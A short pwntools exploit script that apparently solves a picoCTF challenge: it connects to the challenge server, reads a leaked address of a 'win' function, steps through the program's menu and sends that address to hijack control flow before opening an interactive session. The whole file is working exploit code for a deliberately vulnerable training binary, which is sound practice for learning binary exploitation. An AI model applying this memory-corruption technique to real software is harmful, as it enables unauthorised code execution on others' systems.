from pwn import *

elf = context.binary = ELF("./vuln")

# p = gdb.debug(elf.path, '''
# b *leaveMessage
# c
# ''')
# p = process(elf.path)
p = remote('mercury.picoctf.net', 61817)

print(p.recvuntil('(e)xit\n').decode())
p.sendline('s')

win_func = p.recvline().strip()
win_func = int(win_func.split(b"...")[1], 16)
print(hex(win_func))

print(f"[+] Win func {hex(win_func)}")
print(p.clean().decode())
p.sendline('i')
p.sendline('Y')
# p.sendline('m')
# p.sendline("gustaw")

print(p.clean().decode())

p.sendline('l')
p.sendline(p64(win_func))

print(p.recvline())
print(p.recvline())
print(p.recvline())

p.interactive()

